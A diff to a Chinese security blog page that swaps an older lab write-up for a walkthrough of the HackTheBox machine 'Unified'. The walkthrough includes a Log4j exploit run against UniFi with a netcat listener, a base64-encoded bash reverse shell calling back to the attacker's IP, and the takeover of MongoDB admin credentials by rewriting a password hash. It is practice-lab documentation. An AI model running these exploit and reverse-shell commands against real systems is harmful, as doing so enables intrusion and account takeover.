@@ -8,7 +8,7 @@
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
 /><title>
-  FALL靶机 | L
+  htb-Unified | L
 </title>
 <meta name="description" content="少女祈祷中..."/><script>
   window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://test692618.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
@@ -33,20 +33,20 @@
     type="font/woff2"
     crossorigin="anonymous"
   /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" /><meta property="og:type" content="website" />
-  <meta property="og:title" content="FALL靶机 | L" />
+  <meta property="og:title" content="htb-Unified | L" />
   <meta
     property="og:description"
     content="少女祈祷中..."
   />
-  <meta property="og:url" content="https://test692618.github.io/post/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/0x02-fall-/" />
+  <meta property="og:url" content="https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-unified/" />
   <meta
     property="og:site_name"
     content="HELLO WORLD"
   />
   <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
   <meta property="article:author" content="L" />
-  <meta property="article:published_time" content="2024-01-28T17:15:13&#43;00:00" />
-  <meta property="article:modified_time" content="2024-01-28T17:15:13&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
+  <meta property="article:published_time" content="2026-03-28T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-03-28T00:00:00&#43;00:00" /><meta property="article:tag" content="htb" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.3cb430561af988141327a9e105860d0e1d0f240a915b0c600564590371ef51c3.css" /><link
     rel="preload"
     as="style"
@@ -170,9 +170,9 @@
         });
       </script>
     </nav></div>
-<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="FALL靶机"><div id="header-outer">
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="htb-Unified"><div id="header-outer">
     <div id="header-title"><span id="logo">
-            <h1 data-aos="slide-up">FALL靶机</h1>
+            <h1 data-aos="slide-up">htb-Unified</h1>
           </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
   </div>
 </header><div id="content"
@@ -186,8 +186,9 @@
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#port-scan">PORT-SCAN</a></li>
-    <li><a href="#web-pte">WEB-PTE</a></li>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#网站测试">网站测试</a></li>
+    <li><a href="#权限提升">权限提升</a></li>
   </ul>
 </nav>
 </div></div>
@@ -267,73 +268,127 @@
     class="article-date-link icon-calendar"
     data-aos="zoom-in"
   >
-    <time datetime="2024-01-28 17:15:13 &#43;0000 UTC" itemprop="datePublished"
-      >2024-01-28</time
+    <time datetime="2026-03-28 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2026-03-28</time
     >
     <time style="display: none;" id="post-update-time"
-      >2024-01-28</time
+      >2026-03-28</time
     >
   </span></div>
-</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="port-scan">
-<a class="header-anchor" href="#port-scan"></a>
-PORT-SCAN
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">22/tcp    open   ssh
-</span></span><span class="line"><span class="cl">80/tcp    open   http
-</span></span><span class="line"><span class="cl">111/tcp   closed rpcbind
-</span></span><span class="line"><span class="cl">139/tcp   open   netbios-ssn
-</span></span><span class="line"><span class="cl">443/tcp   open   https
-</span></span><span class="line"><span class="cl">445/tcp   open   microsoft-ds
-</span></span><span class="line"><span class="cl">3306/tcp  open   mysql
-</span></span><span class="line"><span class="cl">8000/tcp  closed http-alt
-</span></span><span class="line"><span class="cl">8080/tcp  closed http-proxy
-</span></span><span class="line"><span class="cl">8443/tcp  closed https-alt
-</span></span><span class="line"><span class="cl">9090/tcp  open   zeus-admin
-</span></span><span class="line"><span class="cl">10080/tcp closed amanda
-</span></span><span class="line"><span class="cl">10443/tcp closed cirrossp
-</span></span></code></pre></div><p>可用 22 ，80 ， 139，445  ，443 ， 3306 ，9090</p>
-<h2 id="web-pte">
-<a class="header-anchor" href="#web-pte"></a>
-WEB-PTE
-</h2><p><img src="./image-20231116232006846.png" alt="image-20231116232006846"></p>
-<p>发现文件包含漏洞，打点思路</p>
-<pre><code>1. 对passwd 和 shadow 文件包含是否可直接查看。
-1. 利用字典爆破枚举，存在哪些目录，比如etc目录下有无类似knockd 对端口进行隐藏的服务。
-1. 寻找日志文件，比如登陆失败，http日志（access.log）等。通过访问日志将webshell写入，再利用文件包含漏洞。
-1. 寻找账户家目录的敏感文件，如.bash_history 或.ssh 等。
-</code></pre>
-<p>这次靶机利用了第4点思路。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ ssh-keygen 
-</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
-</span></span><span class="line"><span class="cl">Enter file in which to save the key <span class="o">(</span>/home/kali/.ssh/id_rsa<span class="o">)</span>: 
-</span></span><span class="line"><span class="cl"><span class="c1">##密钥生成时，会在当前用户家目录的.ssh目录下生成 id_rsa  id_rsa.pub 文件</span>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="端口枚举">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e6%9e%9a%e4%b8%be"></a>
+端口枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Not shown: <span class="m">996</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">6789/tcp open  ibm-db2-admin
+</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy
+</span></span><span class="line"><span class="cl">8443/tcp open  https-alt
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">默认情况下，配置时需要将公钥名称改为authorized_keys或authorized_keys2，当然存在对配置文件进行修改
-</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/26<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ cat /etc/ssh/sshd_config <span class="p">|</span> grep auth                                 
-</span></span><span class="line"><span class="cl"><span class="c1"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2</span>
+</span></span><span class="line"><span class="cl">//8080，8443指向同一个网站；6789可能是DB2数据库 或 UniFi网络控制器用于UniFi移动速度测试的TCP端口。
+</span></span></code></pre></div><h2 id="网站测试">
+<a class="header-anchor" href="#%e7%bd%91%e7%ab%99%e6%b5%8b%e8%af%95"></a>
+网站测试
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//该网站服务为 UniFi Network 版本 6.4.54，该服务存在的漏洞就是大名鼎鼎log4j（CVE-2021-44228）
+</span></span><span class="line"><span class="cl">//直接下载exp，地址：https://github.com/puzzlepeaches/Log4jUnifi
+</span></span><span class="line"><span class="cl">//exp一把梭
+</span></span><span class="line"><span class="cl">sudo nc -lvvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">sudo python3 exploit.py -u https://10.129.96.149:8443/ -i 10.10.16.65 -p <span class="m">4444</span>
+</span></span></code></pre></div><h2 id="权限提升">
+<a class="header-anchor" href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+权限提升
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ sudo nc -lvvp <span class="m">4444</span> 
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">10.129.96.149: inverse host lookup failed: Unknown host
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.65<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.149<span class="o">]</span> <span class="m">38070</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/usr/lib/unifi
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>999<span class="o">(</span>unifi<span class="o">)</span>
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">unifi   // 获得低权限shell
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">因此通过文件包含寻找到公私钥，存到本地，进行登录。
-</span></span><span class="line"><span class="cl">注意私钥文件使用时 权限必须为0400 否则会报错。
+</span></span><span class="line"><span class="cl">----------------------------------------------
+</span></span><span class="line"><span class="cl">//查看进程时发现运行mongodb服务。注意到mongodb数据库仅本地监听，且端口时27117，非默认端口。
+</span></span><span class="line"><span class="cl">ps -aux
+</span></span><span class="line"><span class="cl">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+</span></span><span class="line"><span class="cl">unifi          <span class="m">1</span>  0.0  0.0   <span class="m">1080</span>     <span class="m">4</span> ?        Ss   12:35   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi
+</span></span><span class="line"><span class="cl">unifi          <span class="m">7</span>  0.0  0.1  <span class="m">18512</span>  <span class="m">3176</span> ?        S    12:35   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi
+</span></span><span class="line"><span class="cl">unifi         <span class="m">17</span>  2.5 22.6 <span class="m">3670820</span> <span class="m">460968</span> ?      Sl   12:35   0:35 java -Dunifi.datadir<span class="o">=</span>/unifi/data -Dunifi.logdir<span class="o">=</span>/unifi/log -Dunifi.rundir<span class="o">=</span>/var/run/unifi -Xmx1024M -Djava.awt.headless<span class="o">=</span><span class="nb">true</span> -Dfile.encoding<span class="o">=</span>UTF-8 -jar /usr/lib/unifi/lib/ace.jar start
+</span></span><span class="line"><span class="cl">unifi         <span class="m">67</span>  0.3  4.1 <span class="m">1100676</span> <span class="m">84600</span> ?       Sl   12:35   0:05 bin/mongod --dbpath /usr/lib/unifi/data/db --port <span class="m">27117</span> --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+</span></span><span class="line"><span class="cl">unifi        <span class="m">600</span>  0.0  0.1  <span class="m">18380</span>  <span class="m">3136</span> ?        S    12:51   0:00 bash -c <span class="o">{</span>echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNjUvNDQ0NCAwPiYx<span class="o">}</span><span class="p">|</span><span class="o">{</span>base64,-d<span class="o">}</span><span class="p">|</span><span class="o">{</span>bash,-i<span class="o">}</span>
+</span></span><span class="line"><span class="cl">unifi        <span class="m">604</span>  0.0  0.1  <span class="m">18512</span>  <span class="m">3328</span> ?        S    12:51   0:00 bash -i
+</span></span><span class="line"><span class="cl">unifi        <span class="m">607</span>  0.0  0.1  <span class="m">18380</span>  <span class="m">3180</span> ?        S    12:51   0:00 bash
+</span></span><span class="line"><span class="cl">unifi        <span class="m">789</span>  0.0  0.1  <span class="m">34408</span>  <span class="m">2916</span> ?        R    12:58   0:00 ps -aux
+</span></span><span class="line"><span class="cl">mongo -p^H
+</span></span><span class="line"><span class="cl">MongoDB shell version v3.6.3
+</span></span><span class="line"><span class="cl">connecting to: mongodb://127.0.0.1:27017
+</span></span><span class="line"><span class="cl">2026-03-28T12:59:09.156+0000 W NETWORK  <span class="o">[</span>thread1<span class="o">]</span> Failed to connect to 127.0.0.1:27017, in<span class="o">(</span>checking socket <span class="k">for</span> error after poll<span class="o">)</span>, reason: Connection refused
+</span></span><span class="line"><span class="cl">2026-03-28T12:59:09.158+0000 E QUERY    <span class="o">[</span>thread1<span class="o">]</span> Error: couldn<span class="s1">&#39;t connect to server 127.0.0.1:27017, connection attempt failed :
+</span></span></span><span class="line"><span class="cl"><span class="s1">connect@src/mongo/shell/mongo.js:251:13
+</span></span></span><span class="line"><span class="cl"><span class="s1">@(connect):1:6
+</span></span></span><span class="line"><span class="cl"><span class="s1">exception: connect failed
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//使用mongo工具直接本地访问，指定27117端口。mongodb数据库未设置本地身份校验。
+</span></span></span><span class="line"><span class="cl"><span class="s1">mongo --port 27117
+</span></span></span><span class="line"><span class="cl"><span class="s1">MongoDB shell version v3.6.3
+</span></span></span><span class="line"><span class="cl"><span class="s1">connecting to: mongodb://127.0.0.1:27117/
+</span></span></span><span class="line"><span class="cl"><span class="s1">MongoDB server version: 3.6.3
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//列出数据库，注意到仅ace库中数据存储最大。
+</span></span></span><span class="line"><span class="cl"><span class="s1">show dbs                                                                                                           
+</span></span></span><span class="line"><span class="cl"><span class="s1">ace       0.002GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">ace_stat  0.000GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">admin     0.000GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">config    0.000GB                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">local     0.000GB
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//运行该命令查询：db.admin.find().forEach(printjson)
+</span></span></span><span class="line"><span class="cl"><span class="s1">//db.admin.find()：查询admin表下的所有数据，即查询所有用户
+</span></span></span><span class="line"><span class="cl"><span class="s1">//forEach():遍历
+</span></span></span><span class="line"><span class="cl"><span class="s1">//printjson:json格式打印
+</span></span></span><span class="line"><span class="cl"><span class="s1">db.admin.find().forEach(printjson)                                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="s1">{                                                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;_id&#34; : ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;),                                                               
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;name&#34; : &#34;administrator&#34;,                                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;email&#34; : &#34;administrator@unified.htb&#34;,                                                                     
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;x_shadow&#34; : &#34;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&#34;,               
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;time_created&#34; : NumberLong(1640900495),                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;last_site_name&#34; : &#34;default&#34;,                                                                               
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#34;ui_settings&#34; : {          
+</span></span></span><span class="line"><span class="cl"><span class="s1">//注意到name和x_shadow，x_shadow为密码hash。
+</span></span></span><span class="line"><span class="cl"><span class="s1">//这里有两种思路，一是对hash值暴力破解，二是通过db.admin.update()函数修改x_shadow。
+</span></span></span><span class="line"><span class="cl"><span class="s1">//经测试，第一种思路尝试暴力破解失败。现在采取第二种思路。
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//step.1 使用hashid工具，得知该hash为sha-512的hash值。
+</span></span></span><span class="line"><span class="cl"><span class="s1">hashid &#39;</span><span class="nv">$6$Ry6Vdbse$8</span>enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.<span class="err">&#39;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/26<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ chmod <span class="m">0400</span> id-rsa 
-</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/26<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ ssh qiu@192.168.1.26 -i id-rsa 
-</span></span><span class="line"><span class="cl">成功登录。
+</span></span><span class="line"><span class="cl">//step.2 使用mkpasswd工具，生成hash值。
+</span></span><span class="line"><span class="cl">mkpasswd -m sha-512 <span class="m">123456</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$6$hQDwYPIT1sfBF1D6$OaJn4x3fhbA</span>/.PG3C41C8oYii66ad5Ny7eE6UwGJkppz0G6bwg/meSC243XZFuJb7ccoMwZl0HQj4JlFoK1Vs/
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">然后通过翻阅.bash_history文件 发现敏感命令，进行提权。
-</span></span></code></pre></div></div>
+</span></span><span class="line"><span class="cl">//step.3 通过db.admin.update<span class="o">()</span>函数修改x_shadow
+</span></span><span class="line"><span class="cl">db.admin.update<span class="o">({</span><span class="s2">&#34;_id&#34;</span>:ObjectId<span class="o">(</span><span class="s2">&#34;61ce278f46e0fb0012d47ee4&#34;</span><span class="o">)}</span>,<span class="o">{</span><span class="nv">$set</span>:<span class="o">{</span><span class="s2">&#34;x_shadow&#34;</span>:<span class="s2">&#34;</span><span class="nv">$6$hQDwYPIT1sfBF1D6$OaJn4x3fhbA</span><span class="s2">/.PG3C41C8oYii66ad5Ny7eE6UwGJkppz0G6bwg/meSC243XZFuJb7ccoMwZl0HQj4JlFoK1Vs/&#34;</span><span class="o">}})</span>
+</span></span></code></pre></div><p>登录后，在setting界面，site选项中发现root账户的ssh连接密码：NotACrackablePassword4U2022</p>
+<p><img src="./../images/image-20260328211044002.png" alt="image-20260328211044002"></p>
+<p>通过ssh访问，可直接在/home和/root目录中获取user.txt 和root.txt</p>
+</div>
     <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
     <a
       class="article-category-link"
-      href="/categories/%e9%9d%b6%e6%9c%ba%e7%bb%83%e4%b9%a0"
+      href="/categories/htb"
       data-aos="zoom-in"
-      >靶机练习</a
+      >HTB</a
     >
     </li></ul>
-<ul class="article-tag-list" itemprop="keywords"></ul>
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/htb"
+        rel="tag"
+        >htb</a
+      >
+    </li></ul>
 </footer>
   </div><nav
     id="article-nav"
@@ -342,27 +397,15 @@ WEB-PTE
   ><div class="article-nav-link-wrap left"><img
               data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
               data-sizes="auto"
-              alt="IMF"
+              alt="htb-Oopsie"
               class="lazyload"
             /><a
-          href="/post/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/0x08-/"
-          aria-label="前一篇:IMF"
-          title="前一篇:IMF"
+          href="/post/htb/htb%E6%89%93%E9%9D%B6-oopsie/"
+          aria-label="前一篇:htb-Oopsie"
+          title="前一篇:htb-Oopsie"
         ></a>
         <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">IMF</h3>
-      </div><div class="article-nav-link-wrap right"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
-              data-sizes="auto"
-              alt="Djinn靶机"
-              class="lazyload"
-            /><a
-          href="/post/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/0x04-djinn/"
-          aria-label="后一篇:Djinn靶机"
-          title="后一篇:Djinn靶机"
-        ></a>
-        <div class="article-nav-caption">后一篇</div>
-        <h3 class="article-nav-title">Djinn靶机</h3>
+        <h3 class="article-nav-title">htb-Oopsie</h3>
       </div></nav></article></section>
         </div><footer id="footer" aria-label="Site footer">
   <div style="width: 100%; overflow: hidden">
@@ -413,8 +456,9 @@ WEB-PTE
 <div class="sidebar-toc-wrapper toc-div-class">
   <nav id="TableOfContents">
   <ul>
-    <li><a href="#port-scan">PORT-SCAN</a></li>
-    <li><a href="#web-pte">WEB-PTE</a></li>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#网站测试">网站测试</a></li>
+    <li><a href="#权限提升">权限提升</a></li>
   </ul>
 </nav>
 </div></div>
@@ -528,9 +572,9 @@ WEB-PTE
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "L",
-          title: "FALL靶机",
-          url: "https:\/\/test692618.github.io\/post\/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0\/0x02-fall-\/",
-          description: " PORT-SCAN 22\/tcp open ssh 80\/tcp open http 111\/tcp closed rpcbind 139\/tcp open netbios-ssn 443\/tcp open https 445\/tcp open microsoft-ds 3306\/tcp open mysql 8000\/tcp closed http-alt 8080\/tcp closed http-proxy 8443\/tcp closed https-alt 9090\/tcp open zeus-admin 10080\/tcp closed amanda 10443\/tcp closed …",
+          title: "htb-Unified",
+          url: "https:\/\/test692618.github.io\/post\/htb\/htb%E6%89%93%E9%9D%B6-unified\/",
+          description: " 端口枚举 Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE 22\/tcp open ssh 6789\/tcp open ibm-db2-admin 8080\/tcp open http-proxy 8443\/tcp open https-alt \/\/8080，8443指向同一个网站；6789可能是DB2数据库 或 UniFi网络控制器用于UniFi移动速度测试的TCP端口。 网站测试 \/\/该网站服务为 UniFi Network 版本 6.4.54，该服务存在的漏洞就是大名鼎鼎log4j（CVE-2021-44228） \/\/ …",
           cover: "https:\/\/test692618.github.io\/images\/banner.webp",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
